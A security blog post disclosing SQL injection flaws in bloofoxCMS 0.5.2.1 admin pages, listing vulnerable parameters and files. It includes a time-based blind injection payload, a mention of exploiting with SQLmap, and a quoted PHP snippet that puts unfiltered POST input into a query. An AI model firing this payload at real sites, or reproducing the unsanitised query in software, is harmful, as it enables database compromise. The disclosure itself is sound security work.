=== Content from ndmcyb.hashnode.dev_fe855877_20250114_221327.html ===
[cybhunt()ndm](/?source=top_nav_blog_home)Follow[cybhunt()ndm](/?source=top_nav_blog_home)Follow
# bloofox v0.5.2.1 was discovered to contain many SQL injection vulnerability

[![](data:image/svg+xml...)![Mạnh Đình Nguyễn's photo](data:image/gif;base64...)![Mạnh Đình Nguyễn's photo](https://cdn.hashnode.com/res/hashnode/image/upload/v1681825682763/Zliop3bJc.jpeg?w=200&h=200&fit=crop&crop=faces&auto=compress,format&format=webp)](https://hashnode.com/%40ndmcy)[Mạnh Đình Nguyễn](https://hashnode.com/%40ndmcy)·[May 30, 2023](https://ndmcyb.hashnode.dev/bloofox-v0521-was-discovered-to-contain-many-sql-injection-vulnerability)·

1 min read

### **Vendor Homepage:**

[bloofoxCMS - Home](https://www.bloofox.com/)

### **Version:**

0.5.2.1

### **Tested On:**

Macos, review source code

### **Affected Page:**

[admin/index.php?mode=settings&page=projects&action=edit](https://demo.bloofox.com/admin/index.php?mode=settings&page=projects&action=edit) [Parameter cid]

[admin/index.php?mode=settings&page=plugins&action=edit](https://demo.bloofox.com/admin/index.php?mode=settings&page=plugins&action=edit)[Parameter pid]

[admin/index.php?mode=settings&page=lang&action=edit](https://demo.bloofox.com/admin/index.php?mode=settings&page=lang&action=edit) [Parameter lid]

[admin/index.php?mode=settings&page=tmpl&action=edit](https://demo.bloofox.com/admin/index.php?mode=settings&page=tmpl&action=edit) [Parameter tid]

[admin/index.php?mode=settings&page=charset&action=edit](https://demo.bloofox.com/admin/index.php?mode=settings&page=charset&action=edit) [Parameter cid]

[admin/index.php?mode=user&action=edit](https://demo.bloofox.com/admin/index.php?mode=user&action=edit) [Parameter userid]

[admin/index.php?mode=user&page=groups&action=edit](https://demo.bloofox.com/admin/index.php?mode=user&page=groups&action=edit) [Parameter gid]

### **Affected Code:**

bloofoxCMS/admin/include/inc\_settings\_plugins.php

bloofoxCMS/admin/include/inc\_settings\_projects.php

bloofoxCMS/admin/include/inc\_settings\_lang.php

bloofoxCMS/admin/include/inc\_settings\_tmpl.php

bloofoxCMS/admin/include/inc\_settings\_charset.php

bloofoxCMS/admin/include/inc\_user\_user.php

bloofoxCMS/admin/include/inc\_user\_groups.php

### **Description:**

A vulnerability SQL injection was found in bloofoxCMS version 0.5.2.1. It has been classified as critical. SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

### **Proof of Concept:**

#### **1. Visit function plugin and edit plugin item:**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1685465379120/477c08e6-e3c6-419b-8421-65ffdcbaa7b9.png?auto=compress,format&format=webp)

#### **2. Intercept request edit and inject payload sql injection to sleep 5 seconds :**

```
4'+AND+(SELECT+7401+FROM+(SELECT(SLEEP(5)))hwrS)--+Ptkr%26send%3dSave

```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1685467366657/db1d9ea6-493d-451e-852f-90383389bbe5.png?auto=compress,format&format=webp)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1685466989323/30eecd04-ce0f-482d-8e1e-7b1126d66979.png?auto=compress,format&format=webp)

#### **3. Run SQLmap to exploit:**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1685467089218/3b48b52c-35e2-41fe-8459-4fc812240167.png?auto=compress,format&format=webp)

### **SOURCE CODE VULNERABLE**

.$\_POST['pid'] does not have any filter or validate.

*bloofoxCMS/admin/include/inc\_settings\_plugins.php*

```
        if(isset($_POST['send']) && $sys_group_vars['demo'] == 0 && $sys_rights['set_plugins']['write'] == 1) {
            $db->query("UPDATE ".$tbl_prefix."sys_plugin SET status = '".$_POST['status']."' WHERE pid = '".$_POST['pid']."' LIMIT 1");
            CreateConfirmMessage(1,get_caption("0390","Changes have been saved."));
            load_url("index.php?mode=settings&page=plugins");
        }

```
[CVE](/tag/cve?source=tags_bottom_blogs) Share this
